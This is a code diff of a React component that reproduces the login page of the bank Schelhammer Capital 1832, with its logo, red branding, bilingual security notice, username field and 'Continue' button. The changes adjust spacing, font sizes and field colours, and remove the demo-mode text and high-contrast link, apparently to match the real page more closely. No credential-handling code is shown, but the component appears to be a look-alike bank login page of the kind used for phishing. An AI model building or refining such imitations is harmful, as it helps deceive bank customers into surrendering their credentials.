@@ -12,7 +12,7 @@ const Schelhammer = () => {
     <div className="min-h-screen flex flex-col">
       {/* Header */}
       <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
-        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-3">
+        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-1">
           <img src={schelhammerLogo} alt="Schelhammer Capital 1832" className="h-10 md:h-14" />
         </div>
       </header>
@@ -30,7 +30,7 @@ const Schelhammer = () => {
         <div className="w-full max-w-[560px] rounded overflow-hidden">
           {/* Red header bar */}
           <div
-            className="px-6 py-4 text-white font-semibold text-xl"
+            className="px-6 py-4 text-white font-semibold text-2xl"
             style={{ backgroundColor: "#d31220" }}
           >
             Login
@@ -39,36 +39,21 @@ const Schelhammer = () => {
           {/* Card body */}
           <div className="bg-white px-6 py-5 space-y-4">
             {/* Info text */}
-            <p className="text-base leading-snug" style={{ color: "#333" }}>
+            <p className="text-base leading-tight" style={{ color: "#333" }}>
               {lang === "de"
                 ? "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
                 : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
             </p>
 
-            {/* Demo text */}
-            <p className="text-base leading-snug" style={{ color: "#333" }}>
-              {lang === "de"
-                ? "Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben."
-                : "Would you like to view the demo version? In this case, you do not need to enter any access data."}
-            </p>
-
             {/* Divider */}
-            <hr className="-mx-6 border-gray-200" />
+            <hr className="border-gray-200" />
 
             {/* Label row */}
             <div className="flex items-center justify-between">
-              <span className="font-semibold text-xs" style={{ color: "#999" }}>
+              <span className="font-semibold text-sm" style={{ color: "#999" }}>
                 {lang === "de" ? "Benutzername" : "Username"}
               </span>
-              <span className="text-sm space-x-2">
-                <a
-                  href="#"
-                  onClick={(e) => e.preventDefault()}
-                  style={{ color: "#333" }}
-                >
-                  {lang === "de" ? "Hochkontrast" : "High contrast"}
-                </a>
-                <span style={{ color: "#999" }}>|</span>
+              <span className="text-sm">
                 <a
                   href="#"
                   onClick={(e) => {
@@ -92,8 +77,8 @@ const Schelhammer = () => {
                 onBlur={() => setIsFocused(false)}
                 className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                 style={{
-                  backgroundColor: isFocused ? "#f5d5d8" : "#e8e8e8",
-                  borderColor: isFocused ? "#d31220" : "#999",
+                  backgroundColor: isFocused ? "#f5d5d8" : "#f1f1f1",
+                  borderColor: isFocused ? "#d31220" : "#dedede",
                   boxShadow: isFocused ? "0 0 0 1px #d31220" : "none",
                 }}
               />
@@ -127,9 +112,12 @@ const Schelhammer = () => {
                 : "By entering your access data, you expressly agree to the bank's terms of use."}
             </p>
 
+            {/* Full-width divider above button */}
+            <hr className="-mx-6 border-gray-200" />
+
             {/* Weiter button */}
             <button
-              className="w-full py-3 text-white font-semibold rounded text-sm"
+              className="w-full py-3 text-white font-semibold rounded text-base"
               style={{ backgroundColor: "#d31220" }}
             >
               {lang === "de" ? "Weiter" : "Continue"}
@@ -146,7 +134,7 @@ const Schelhammer = () => {
                 className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#d31220" }}
               >
-                {lang === "de" ? "Benutzername vergessen?" : "Forgot username?"}
+                {lang === "de" ? "Benutzername vergessen" : "Forgot username"}
               </a>
               <a
                 href="#"
@@ -154,7 +142,7 @@ const Schelhammer = () => {
                 className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                 style={{ color: "#d31220" }}
               >
-                {lang === "de" ? "Passwort vergessen?" : "Forgot password?"}
+                {lang === "de" ? "Passwort vergessen" : "Forgot password"}
               </a>
             </div>
           </div>
